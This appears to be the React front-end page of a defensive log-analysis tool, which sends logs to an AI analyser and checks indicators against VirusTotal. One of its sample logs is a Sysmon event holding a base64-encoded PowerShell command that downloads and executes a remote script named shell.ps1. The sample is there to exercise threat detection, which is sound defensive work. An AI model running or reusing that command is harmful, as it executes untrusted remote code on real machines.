'use client'
import { useState } from 'react'

const FORMATS = ['Auto-detect','Sysmon XML','Windows Event Log','Azure AD Sign-in','Firewall log','Splunk result','AWS CloudTrail','CrowdStrike Falcon']
const SAMPLES = [
  { label:'Sysmon Event 1', log:`<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>1</EventID></System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=</Data>
    <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
    <Data Name="User">CORP\\jsmith</Data>
  </EventData>
</Event>` },
  { label:'Security 4625', log:`{ "EventID": 4625, "AccountName": "administrator", "WorkstationName": "DESKTOP-ABC123", "IpAddress": "185.220.101.45", "LogonType": 3, "FailureReason": "Unknown user name or bad password", "TimeGenerated": "2026-05-16T00:14:22Z" }` },
  { label:'Azure AD Sign-in', log:`{ "userPrincipalName": "john.smith@company.com", "appDisplayName": "Microsoft Teams", "status": { "failureReason": "Invalid credentials", "errorCode": 50126 }, "location": { "city": "Moscow", "countryOrRegion": "RU" }, "ipAddress": "185.220.101.45", "conditionalAccessStatus": "notApplied", "createdDateTime": "2026-05-16T00:14:22Z" }` },
]

const THREAT_COLORS: Record<string, { bg: string; fg: string; bd: string }> = {
  Critical: { bg:'var(--red-bg)',   fg:'var(--red)',   bd:'var(--red-bd)'   },
  High:     { bg:'var(--red-bg)',   fg:'var(--red)',   bd:'var(--red-bd)'   },
  Medium:   { bg:'#fff7ed',         fg:'#c2410c',      bd:'#fed7aa'         },
  Low:      { bg:'var(--blue-bg)',  fg:'var(--blue)',  bd:'var(--blue-bd)'  },
  Benign:   { bg:'var(--green-bg)', fg:'var(--green)', bd:'var(--green-bd)' },
}

const REP_COLORS: Record<string, string> = {
  malicious:  'var(--red)',
  suspicious: '#f97316',
  clean:      'var(--green)',
}

interface VTResult {
  value: string; type: string; malicious: number; suspicious: number
  total: number; reputation: string; score: string; country: string | null
  as_owner: string | null; vt_link: string
}

function esc(s: string) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') }

export default function AnalyserPage() {
  const [log,       setLog]       = useState('')
  const [format,    setFormat]    = useState('Auto-detect')
  const [loading,   setLoading]   = useState(false)
  const [error,     setError]     = useState('')
  const [result,    setResult]    = useState<any>(null)
  const [model,     setModel]     = useState('')
  const [vtResults, setVtResults] = useState<VTResult[]>([])
  const [vtLoading, setVtLoading] = useState(false)
  const [vtError,   setVtError]   = useState('')

  async function analyse() {
    if (!log.trim() || log.trim().length < 20) { setError('Paste a log entry (min 20 characters)'); return }
    setLoading(true); setError(''); setResult(null); setVtResults([]); setVtError('')
    try {
      const res = await fetch('/api/analyse', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ log, format }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data.error || 'Analysis failed')
      setResult(data.analysis); setModel(data.model_used)

      // Auto-enrich indicators with VirusTotal
      const indicators = data.analysis?.indicators || []
      if (indicators.length > 0) enrichIndicators(indicators)
    } catch (e: unknown) {
      setError(e instanceof Error ? e.message : 'Analysis failed')
    } finally { setLoading(false) }
  }

  async function enrichIndicators(indicators: string[]) {
    setVtLoading(true); setVtError('')
    try {
      const res = await fetch('/api/enrich', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ indicators }),
      })
      const data = await res.json()
      if (data.error && !data.results?.length) {
        setVtError(data.error)
      } else {
        setVtResults(data.results || [])
      }
    } catch { /* silent — VT enrichment is optional */ }
    finally { setVtLoading(false) }
  }

  const tColor = result ? (THREAT_COLORS[result.threat_level] || THREAT_COLORS.Low) : null
  const btn: React.CSSProperties = { padding:'.3rem .7rem', borderRadius:6, border:'1px solid var(--border)', background:'var(--bg)', color:'var(--muted)', fontSize:'.7rem', cursor:'pointer', fontFamily:'inherit' }

  return (
    <div style={{ display:'grid', gridTemplateColumns:'minmax(300px,420px) 1fr', minHeight:'calc(100vh - 48px)' }}>

      {/* Input */}
      <div style={{ padding:'1.25rem', borderRight:'1px solid var(--border)', display:'flex', flexDirection:'column', gap:'1rem' }}>
        <div style={{ background:'var(--bg4)', border:'1px solid var(--border)', borderRadius:12, padding:'1.1rem', display:'flex', flexDirection:'column', gap:'.75rem' }}>
          <div>
            <div style={{ fontSize:'.88rem', fontWeight:700, color:'var(--text)', marginBottom:'.25rem' }}>Log Analyser</div>
            <div style={{ fontSize:'.75rem', color:'var(--muted)' }}>Paste any raw log — AI explains what happened and identifies threats. IPs and hashes are automatically checked against VirusTotal.</div>
          </div>
          <div>
            <div style={{ fontSize:'.67rem', color:'var(--muted)', marginBottom:'.28rem' }}>Log format</div>
            <select value={format} onChange={e => setFormat(e.target.value)}
              style={{ width:'100%', background:'var(--bg)', border:'1px solid var(--border2)', borderRadius:7, padding:'.48rem .7rem', color:'var(--text)', fontSize:'.78rem', outline:'none', fontFamily:'inherit', cursor:'pointer' }}>
              {FORMATS.map(f => <option key={f} value={f}>{f}</option>)}
            </select>
          </div>
          <textarea value={log} onChange={e => setLog(e.target.value)} rows={12}
            placeholder="Paste your raw log here..."
            style={{ width:'100%', background:'var(--bg)', border:'1px solid var(--border2)', borderRadius:9, padding:'.85rem .9rem', color:'var(--text)', fontSize:'.75rem', outline:'none', resize:'none', lineHeight:1.7, fontFamily:'monospace', transition:'border-color .2s' }}
            onFocus={e => e.target.style.borderColor='rgba(249,115,22,.45)'}
            onBlur={e => e.target.style.borderColor='var(--border2)'}/>
          <div>
            <div style={{ fontSize:'.65rem', color:'var(--muted)', marginBottom:'.35rem' }}>Sample logs:</div>
            <div style={{ display:'flex', gap:'.35rem', flexWrap:'wrap' }}>
              {SAMPLES.map(s => (
                <button key={s.label} onClick={() => setLog(s.log)} style={{ ...btn, fontSize:'.67rem' }}>{s.label}</button>
              ))}
            </div>
          </div>
          {error && <div style={{ background:'var(--red-bg)', border:'1px solid var(--red-bd)', borderRadius:7, padding:'.55rem .8rem', fontSize:'.78rem', color:'var(--red)' }}>{error}</div>}
          <button onClick={analyse} disabled={loading} style={{ padding:'.82rem', background:loading?'var(--muted2)':'#f97316', border:'none', borderRadius:9, color:'#fff', fontWeight:700, fontSize:'.88rem', cursor:loading?'not-allowed':'pointer', fontFamily:'inherit', display:'flex', alignItems:'center', justifyContent:'center', gap:'.5rem' }}>
            {loading ? <><span style={{ width:14, height:14, border:'2px solid rgba(255,255,255,.3)', borderTopColor:'#fff', borderRadius:'50%', display:'inline-block', animation:'spin .65s linear infinite' }}/>Analysing...</> : 'Analyse Log'}
          </button>
        </div>
      </div>

      {/* Result */}
      <div style={{ padding:'1.25rem', overflowY:'auto', background:'var(--bg)' }}>
        {!result && !loading && (
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', minHeight:'60vh', gap:'.75rem', textAlign:'center' }}>
            <div style={{ fontSize:'2.5rem', opacity:.2 }}>🔍</div>
            <div style={{ fontSize:'.92rem', fontWeight:600, color:'var(--text2)' }}>Paste a log to analyse</div>
            <div style={{ fontSize:'.78rem', color:'var(--muted)', maxWidth:280, lineHeight:1.6 }}>Supports Sysmon, Windows Events, Azure AD, firewall logs, CrowdStrike, and more. IPs and hashes are checked against VirusTotal automatically.</div>
          </div>
        )}

        {loading && (
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', minHeight:'60vh', gap:'.85rem' }}>
            <div style={{ width:32, height:32, border:'2.5px solid var(--border2)', borderTopColor:'#f97316', borderRadius:'50%', animation:'spin .8s linear infinite' }}/>
            <div style={{ fontSize:'.78rem', color:'var(--muted)' }}>Analysing log entry...</div>
          </div>
        )}

        {result && (
          <div style={{ display:'flex', flexDirection:'column', gap:'1rem', maxWidth:700 }}>

            {/* Threat level */}
            <div style={{ background:tColor!.bg, border:`1px solid ${tColor!.bd}`, borderRadius:12, padding:'1rem 1.15rem', display:'flex', alignItems:'center', justifyContent:'space-between' }}>
              <div>
                <div style={{ fontSize:'.65rem', fontWeight:700, textTransform:'uppercase', letterSpacing:'.08em', color:tColor!.fg, marginBottom:'.2rem' }}>Threat Level</div>
                <div style={{ fontSize:'1.5rem', fontWeight:800, color:tColor!.fg, letterSpacing:'-.02em' }}>{result.threat_level}</div>
                <div style={{ fontSize:'.75rem', color:tColor!.fg, opacity:.8, marginTop:'.2rem' }}>{result.threat_level_reason}</div>
              </div>
            </div>

            {/* Analysis */}
            <div style={{ background:'var(--bg4)', border:'1px solid var(--border)', borderRadius:12, overflow:'hidden' }}>
              {[
                { label:'Summary',              content: result.summary         },
                { label:'What happened',        content: result.what_happened   },
                { label:'Analyst notes',        content: result.analyst_notes   },
              ].map(sec => sec.content && (
                <div key={sec.label} style={{ padding:'.85rem 1.1rem', borderBottom:'1px solid var(--border)' }}>
                  <div style={{ fontSize:'.62rem', fontWeight:700, textTransform:'uppercase', letterSpacing:'.09em', color:'var(--muted)', marginBottom:'.4rem' }}>{sec.label}</div>
                  <p style={{ fontSize:'.82rem', color:'var(--text2)', lineHeight:1.7, margin:0 }}>{esc(sec.content)}</p>
                </div>
              ))}

              {/* MITRE techniques */}
              {result.mitre_techniques?.length > 0 && (
                <div style={{ padding:'.85rem 1.1rem', borderBottom:'1px solid var(--border)' }}>
                  <div style={{ fontSize:'.62rem', fontWeight:700, textTransform:'uppercase', letterSpacing:'.09em', color:'var(--muted)', marginBottom:'.5rem' }}>MITRE ATT&CK techniques</div>
                  <div style={{ display:'flex', flexWrap:'wrap', gap:'.4rem' }}>
                    {result.mitre_techniques.map((t: any, i: number) => (
                      <span key={i} style={{ padding:'.2rem .6rem', borderRadius:5, fontSize:'.68rem', background:'var(--blue-bg)', color:'var(--blue)', border:'1px solid var(--blue-bd)', fontFamily:'monospace' }}>
                        {t.id} {t.name}
                      </span>
                    ))}
                  </div>
                </div>
              )}

              {/* Indicators */}
              {result.indicators?.length > 0 && (
                <div style={{ padding:'.85rem 1.1rem', borderBottom:'1px solid var(--border)' }}>
                  <div style={{ fontSize:'.62rem', fontWeight:700, textTransform:'uppercase', letterSpacing:'.09em', color:'var(--muted)', marginBottom:'.5rem' }}>
                    Indicators found
                    {vtLoading && <span style={{ marginLeft:'.5rem', color:'#f97316', fontWeight:400 }}>— checking VirusTotal...</span>}
                  </div>
                  <div style={{ display:'flex', flexDirection:'column', gap:'.3rem' }}>
                    {result.indicators.map((ind: string, i: number) => {
                      const vt = vtResults.find(r => r.value === ind.trim())
                      return (
                        <div key={i} style={{ display:'flex', alignItems:'center', gap:'.5rem', flexWrap:'wrap' }}>
                          <code style={{ fontSize:'.72rem', fontFamily:'monospace', background:'var(--bg3)', padding:'.2rem .5rem', borderRadius:4, color:'var(--red)', wordBreak:'break-all' }}>{esc(ind)}</code>
                          {vt && (
                            <a href={vt.vt_link} target="_blank" rel="noopener" style={{ fontSize:'.68rem', padding:'.15rem .45rem', borderRadius:4, background:'transparent', color:REP_COLORS[vt.reputation]||'var(--muted)', border:`1px solid ${REP_COLORS[vt.reputation]||'var(--border)'}`, textDecoration:'none', fontWeight:600, flexShrink:0 }}>
                              VT: {vt.score} {vt.reputation}
                            </a>
                          )}
                        </div>
                      )
                    })}
                  </div>
                  {vtError && <div style={{ fontSize:'.72rem', color:'var(--muted)', marginTop:'.5rem', fontStyle:'italic' }}>VirusTotal: {vtError} — add your VT API key in Settings</div>}
                </div>
              )}

              {/* VirusTotal detail cards */}
              {vtResults.length > 0 && (
                <div style={{ padding:'.85rem 1.1rem', borderBottom:'1px solid var(--border)' }}>
                  <div style={{ fontSize:'.62rem', fontWeight:700, textTransform:'uppercase', letterSpacing:'.09em', color:'var(--muted)', marginBottom:'.5rem' }}>VirusTotal reputation</div>
                  <div style={{ display:'flex', flexDirection:'column', gap:'.5rem' }}>
                    {vtResults.map((vt, i) => (
                      <div key={i} style={{ background:'var(--bg)', border:`1px solid ${REP_COLORS[vt.reputation]||'var(--border)'}`, borderRadius:8, padding:'.65rem .85rem', display:'flex', alignItems:'center', justifyContent:'space-between', gap:'1rem' }}>
                        <div>
                          <code style={{ fontSize:'.72rem', fontFamily:'monospace', color:'var(--text)' }}>{vt.value}</code>
                          {(vt.country || vt.as_owner) && (
                            <div style={{ fontSize:'.68rem', color:'var(--muted)', marginTop:'.15rem' }}>
                              {[vt.country, vt.as_owner].filter(Boolean).join(' · ')}
                            </div>
                          )}
                        </div>
                        <div style={{ display:'flex', alignItems:'center', gap:'.65rem', flexShrink:0 }}>
                          <span style={{ fontSize:'.72rem', fontFamily:'monospace', color:REP_COLORS[vt.reputation]||'var(--muted)', fontWeight:700 }}>{vt.score} vendors flagged</span>
                          <span style={{ fontSize:'.68rem', padding:'.18rem .5rem', borderRadius:4, background:'transparent', border:`1px solid ${REP_COLORS[vt.reputation]||'var(--border)'}`, color:REP_COLORS[vt.reputation]||'var(--muted)', fontWeight:600, textTransform:'capitalize' }}>{vt.reputation}</span>
                          <a href={vt.vt_link} target="_blank" rel="noopener" style={{ fontSize:'.68rem', color:'#f97316', textDecoration:'none' }}>View on VT</a>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Generate detection CTA */}
              {result.generate_detection && result.detection_scenario && (
                <div style={{ padding:'.85rem 1.1rem', background:'rgba(249,115,22,.05)' }}>
                  <div style={{ fontSize:'.62rem', fontWeight:700, textTransform:'uppercase', letterSpacing:'.09em', color:'var(--muted)', marginBottom:'.45rem' }}>Suggested detection</div>
                  <p style={{ fontSize:'.78rem', color:'var(--text2)', margin:'0 0 .65rem' }}>{esc(result.detection_scenario)}</p>
                  <button onClick={() => window.location.href='/generate?prefill='+encodeURIComponent(result.detection_scenario)}
                    style={{ padding:'.5rem 1rem', background:'#f97316', border:'none', borderRadius:7, color:'#fff', fontWeight:600, fontSize:'.78rem', cursor:'pointer', fontFamily:'inherit' }}>
                    Generate Detection Rule from This Log
                  </button>
                </div>
              )}
            </div>

            {model && <div style={{ fontSize:'.65rem', color:'var(--muted2)', fontFamily:'monospace' }}>Analysed by: {model}</div>}
          </div>
        )}
      </div>

      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  )
}
